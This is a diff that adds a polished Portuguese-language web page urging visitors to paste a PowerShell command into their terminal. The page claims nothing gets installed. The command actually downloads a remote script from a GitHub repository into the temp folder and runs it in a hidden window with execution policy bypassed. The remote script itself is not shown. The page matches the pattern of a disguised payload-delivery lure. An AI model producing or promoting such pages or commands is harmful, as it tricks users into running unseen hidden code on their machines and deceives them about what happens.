@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>7834569</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --ease: cubic-bezier(0.22, 1, 0.36, 1);
+    --ease-soft: cubic-bezier(0.4, 0, 0.2, 1);
+  }
+
+  html, body {
+    height: 100%;
+    overflow-x: hidden;
+  }
+
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "SF Pro Text", "Helvetica Neue", system-ui, sans-serif;
+    background: #000;
+    color: #f5f5f7;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 24px;
+    -webkit-font-smoothing: antialiased;
+    position: relative;
+  }
+
+  /* Fundo com gradientes animados suaves */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: -50%;
+    background:
+      radial-gradient(circle at 20% 30%, rgba(88, 166, 255, .35), transparent 45%),
+      radial-gradient(circle at 80% 70%, rgba(163, 113, 247, .30), transparent 45%),
+      radial-gradient(circle at 50% 50%, rgba(247, 120, 186, .18), transparent 55%);
+    filter: blur(80px);
+    animation: floatBg 18s var(--ease-soft) infinite alternate;
+    z-index: 0;
+    will-change: transform;
+  }
+
+  @keyframes floatBg {
+    0%   { transform: translate3d(0, 0, 0) scale(1); }
+    100% { transform: translate3d(3%, -3%, 0) scale(1.15); }
+  }
+
+  .container {
+    position: relative;
+    z-index: 1;
+    width: 100%;
+    max-width: 640px;
+
+    background: rgba(28, 28, 30, 0.72);
+    backdrop-filter: blur(40px) saturate(180%);
+    -webkit-backdrop-filter: blur(40px) saturate(180%);
+    border: 1px solid rgba(255, 255, 255, 0.08);
+    border-radius: 28px;
+    padding: 48px 44px;
+
+    box-shadow:
+      0 1px 0 rgba(255,255,255,.06) inset,
+      0 30px 80px rgba(0, 0, 0, .55),
+      0 10px 30px rgba(0, 0, 0, .35);
+
+    opacity: 0;
+    transform: translateY(24px) scale(.97);
+    animation: enter 900ms var(--ease) 100ms forwards;
+    will-change: transform, opacity;
+  }
+
+  @keyframes enter {
+    to { opacity: 1; transform: translateY(0) scale(1); }
+  }
+
+  /* Ícone / Logo */
+  .logo {
+    width: 64px;
+    height: 64px;
+    margin: 0 auto 26px;
+    border-radius: 18px;
+    background: linear-gradient(135deg, #0a84ff 0%, #5e5ce6 50%, #bf5af2 100%);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 30px;
+    box-shadow: 0 12px 32px rgba(10, 132, 255, .35);
+    opacity: 0;
+    transform: scale(.8);
+    animation: popIn 700ms var(--ease) 250ms forwards;
+  }
+
+  @keyframes popIn {
+    to { opacity: 1; transform: scale(1); }
+  }
+
+  h1 {
+    font-size: 2.1rem;
+    font-weight: 600;
+    letter-spacing: -0.03em;
+    text-align: center;
+    margin-bottom: 12px;
+    background: linear-gradient(180deg, #ffffff 0%, #a1a1aa 100%);
+    -webkit-background-clip: text;
+    background-clip: text;
+    color: transparent;
+    opacity: 0;
+    transform: translateY(12px);
+    animation: fadeUp 700ms var(--ease) 400ms forwards;
+  }
+
+  .sub {
+    text-align: center;
+    color: #86868b;
+    font-size: 1.05rem;
+    font-weight: 400;
+    letter-spacing: -0.01em;
+    line-height: 1.5;
+    margin-bottom: 36px;
+    opacity: 0;
+    transform: translateY(12px);
+    animation: fadeUp 700ms var(--ease) 500ms forwards;
+  }
+
+  @keyframes fadeUp {
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  /* Passos */
+  .steps {
+    background: rgba(255, 255, 255, 0.04);
+    border: 1px solid rgba(255, 255, 255, 0.06);
+    border-radius: 16px;
+    padding: 20px 22px;
+    margin-bottom: 22px;
+    font-size: .92rem;
+    line-height: 1.9;
+    color: #d2d2d7;
+    opacity: 0;
+    transform: translateY(12px);
+    animation: fadeUp 700ms var(--ease) 600ms forwards;
+  }
+
+  .steps ol { padding-left: 20px; }
+  .steps li { padding-left: 4px; }
+  .steps strong { color: #f5f5f7; font-weight: 500; }
+  .steps kbd {
+    display: inline-block;
+    background: rgba(255, 255, 255, 0.08);
+    border: 1px solid rgba(255, 255, 255, 0.1);
+    border-radius: 6px;
+    padding: 1px 7px;
+    font-family: -apple-system, ui-monospace, monospace;
+    font-size: .78rem;
+    color: #f5f5f7;
+    box-shadow: 0 1px 0 rgba(0,0,0,.4);
+  }
+
+  /* Bloco do comando */
+  .code-block {
+    position: relative;
+    background: rgba(0, 0, 0, 0.5);
+    border: 1px solid rgba(255, 255, 255, 0.08);
+    border-radius: 14px;
+    padding: 18px 20px;
+    font-family: ui-monospace, "SF Mono", "JetBrains Mono", Consolas, monospace;
+    font-size: .78rem;
+    color: #66d9a0;
+    line-height: 1.7;
+    overflow-x: auto;
+    white-space: pre-wrap;
+    word-break: break-all;
+    margin-bottom: 22px;
+    letter-spacing: -0.01em;
+    opacity: 0;
+    transform: translateY(12px);
+    animation: fadeUp 700ms var(--ease) 700ms forwards;
+
+    transition: border-color .4s var(--ease-soft), box-shadow .4s var(--ease-soft);
+    cursor: default;
+  }
+
+  .code-block:hover {
+    border-color: rgba(255, 255, 255, 0.16);
+    box-shadow: 0 0 0 4px rgba(10, 132, 255, .06);
+  }
+
+  /* Botões */
+  .actions {
+    display: flex;
+    gap: 12px;
+    flex-wrap: wrap;
+    opacity: 0;
+    transform: translateY(12px);
+    animation: fadeUp 700ms var(--ease) 800ms forwards;
+  }
+
+  .btn {
+    flex: 1;
+    min-width: 180px;
+    padding: 15px 24px;
+    border-radius: 14px;
+    font-size: .98rem;
+    font-weight: 500;
+    letter-spacing: -0.01em;
+    text-align: center;
+    text-decoration: none;
+    cursor: pointer;
+    border: none;
+    font-family: inherit;
+
+    transition:
+      transform .45s var(--ease),
+      background .35s var(--ease-soft),
+      box-shadow .45s var(--ease),
+      color .35s var(--ease-soft);
+    will-change: transform;
+  }
+
+  .btn:active { transform: scale(.97); }
+
+  .btn-primary {
+    background: #0a84ff;
+    color: #fff;
+    box-shadow: 0 8px 24px rgba(10, 132, 255, .30);
+  }
+  .btn-primary:hover {
+    background: #3395ff;
+    box-shadow: 0 12px 32px rgba(10, 132, 255, .45);
+    transform: translateY(-2px);
+  }
+
+  .btn-secondary {
+    background: rgba(255, 255, 255, 0.08);
+    color: #f5f5f7;
+    border: 1px solid rgba(255, 255, 255, 0.08);
+  }
+  .btn-secondary:hover {
+    background: rgba(255, 255, 255, 0.14);
+    transform: translateY(-2px);
+  }
+
+  /* Estado "copiado" */
+  .btn-primary.copied {
+    background: #30d158;
+    box-shadow: 0 8px 24px rgba(48, 209, 88, .35);
+    transform: scale(1.02);
+  }
+
+  .footer {
+    margin-top: 28px;
+    padding-top: 22px;
+    border-top: 1px solid rgba(255, 255, 255, 0.06);
+    font-size: .8rem;
+    color: #6e6e73;
+    text-align: center;
+    letter-spacing: -0.005em;
+    opacity: 0;
+    animation: fadeUp 700ms var(--ease) 900ms forwards;
+  }
+  .footer a {
+    color: #0a84ff;
+    text-decoration: none;
+    transition: opacity .3s var(--ease-soft);
+  }
+  .footer a:hover { opacity: .7; }
+
+  /* Toast */
+  .toast {
+    position: fixed;
+    bottom: 32px;
+    left: 50%;
+    transform: translateX(-50%) translateY(100px) scale(.9);
+    background: rgba(28, 28, 30, 0.85);
+    backdrop-filter: blur(30px) saturate(180%);
+    -webkit-backdrop-filter: blur(30px) saturate(180%);
+    border: 1px solid rgba(255, 255, 255, 0.08);
+    color: #fff;
+    padding: 13px 26px;
+    border-radius: 999px;
+    font-size: .9rem;
+    font-weight: 500;
+    letter-spacing: -0.01em;
+    opacity: 0;
+    pointer-events: none;
+    box-shadow: 0 20px 50px rgba(0,0,0,.5);
+    transition:
+      transform 700ms var(--ease),
+      opacity 500ms var(--ease-soft);
+    z-index: 100;
+  }
+  .toast.show {
+    transform: translateX(-50%) translateY(0) scale(1);
+    opacity: 1;
+  }
+  .toast .dot {
+    display: inline-block;
+    width: 8px; height: 8px;
+    background: #30d158;
+    border-radius: 50%;
+    margin-right: 8px;
+    vertical-align: middle;
+    box-shadow: 0 0 12px rgba(48, 209, 88, .8);
+  }
+
+  /* Responsivo */
+  @media (max-width: 520px) {
+    .container { padding: 36px 26px; border-radius: 24px; }
+    h1 { font-size: 1.7rem; }
+    .sub { font-size: .98rem; }
+    .btn { min-width: 100%; }
+    .logo { width: 56px; height: 56px; font-size: 26px; }
+  }
+
+  /* Respeita redução de movimento */
+  @media (prefers-reduced-motion: reduce) {
+    *, *::before, *::after {
+      animation-duration: .01ms !important;
+      transition-duration: .01ms !important;
+    }
+  }
+</style>
+</head>
+<body>
+
+<div class="container">
+  <div class="logo">⚡</div>
+  <h1>Executar no PowerShell</h1>
+  <p class="sub">Copie o comando, cole no terminal e pressione Enter.<br>Nada é instalado no seu computador.</p>
+
+  <div class="steps">
+    <ol>
+      <li>Abra o <strong>PowerShell</strong> <kbd>Win</kbd> + <kbd>X</kbd></li>
+      <li>Clique em <strong>Copiar comando</strong></li>
+      <li>Cole com <kbd>Ctrl</kbd> + <kbd>V</kbd> e pressione <kbd>Enter</kbd></li>
+    </ol>
+  </div>
+
+  <div class="code-block" id="cmdBox">$p="$env:TEMP\abrir.ps1"; irm 'https://raw.githubusercontent.com/capimmm/7834569/main/abrir.ps1' -OutFile $p; Start-Process powershell -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-WindowStyle','Hidden','-File',$p -WindowStyle Hidden</div>
+
+  <div class="actions">
+    <button class="btn btn-primary" id="copyBtn" onclick="copiar()">Copiar comando</button>
+    <a class="btn btn-secondary" href="https://github.com/capimmm/7834569" target="_blank" rel="noopener">Ver repositório</a>
+  </div>
+
+  <div class="footer">
+    <a href="https://github.com/capimmm/7834569" target="_blank" rel="noopener">github.com/capimmm/7834569</a>
+  </div>
+</div>
+
+<div class="toast" id="toast"><span class="dot"></span>Comando copiado</div>
+
+<script>
+  const cmdBox  = document.getElementById('cmdBox');
+  const copyBtn = document.getElementById('copyBtn');
+  const toast   = document.getElementById('toast');
+  let timeoutId;
+
+  function copiar() {
+    const texto = cmdBox.innerText.trim();
+
+    navigator.clipboard.writeText(texto).then(confirmar).catch(() => {
+      // Fallback pra navegadores antigos
+      const range = document.createRange();
+      range.selectNode(cmdBox);
+      const sel = window.getSelection();
+      sel.removeAllRanges();
+      sel.addRange(range);
+      try { document.execCommand('copy'); confirmar(); } catch(e) {}
+      sel.removeAllRanges();
+    });
+  }
+
+  function confirmar() {
+    copyBtn.textContent = '✓ Copiado';
+    copyBtn.classList.add('copied');
+    toast.classList.add('show');
+
+    clearTimeout(timeoutId);
+    timeoutId = setTimeout(() => {
+      copyBtn.textContent = 'Copiar comando';
+      copyBtn.classList.remove('copied');
+      toast.classList.remove('show');
+    }, 2200);
+  }
+</script>
+</body>
+</html>
